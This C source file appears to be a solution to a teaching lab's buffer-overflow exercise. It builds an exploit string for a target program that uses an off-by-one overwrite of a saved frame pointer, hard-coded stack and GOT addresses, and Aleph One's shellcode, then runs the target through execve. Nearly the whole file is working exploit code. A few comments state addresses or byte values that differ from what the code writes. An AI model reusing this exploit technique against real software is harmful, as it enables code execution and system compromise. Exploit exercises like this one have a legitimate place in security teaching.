#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"
#define EGG_SIZE 208



int main(void)
{
  char *args[3];
  char *env[1];
  long buffAddr, gotAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  buffAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
  gotAddr = 0x8049774; /* GOT address for _exit */

  /* First, fill the exploit string with the start address of the buf
     in bar. We will set it up such that at some point immediately 
     before a 'ret' instruction our stack pointer will point inside 
     buf and hence the 'ret' instruction will pop off and insert 
     0xBFFFFC90 (the start address of buf) into eip. At that point 
     the shellcode will begin executing and we are done. */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
     *(addrPtr++) = buffAddr;
  
  /* The check 'i <= len' inside the for loop in nstrcpy allows us
     to overwrite the LSB of the saved ebp for the foo stack frame,
     which is 0xBFFFFD68. This differs only in the LSB with 0xBFFFFD40
     which is an address inside buf. If we overwrite the LSB of the 
     saved ebp for the foo stack frame to 0x40 then the 'leave' 
     instruction for the bar function call will restore ebp to 
     0xBFFFFD40. Next, the 'leave' instruction for the foo function 
     call will set esp to 0xBFFFFD40, pop off 4 bytes to restore a junk
     ebp and leave esp equal to 0xBFFFFD40. Since the address 
     0xBFFFFD40 is inside buf, it contains the value 0xBFFFFC80 (the 
     start of the buffer) and hence the 'ret' call immediately after 
     will set eip equal to 0xBFFFFC80. 

     Notice EGG_SIZE - 8 is the 201 byte of the exploit string. This
     is exactly the byte that will overwrite the LSB of the saved ebp
     for foo stack frame. */
  egg[EGG_SIZE - 8] = 0x48;

  /* write GOT addr */
  addrPtr = (long *)&egg[EGG_SIZE - 12];
  *addrPtr = gotAddr; 

  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string */

  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
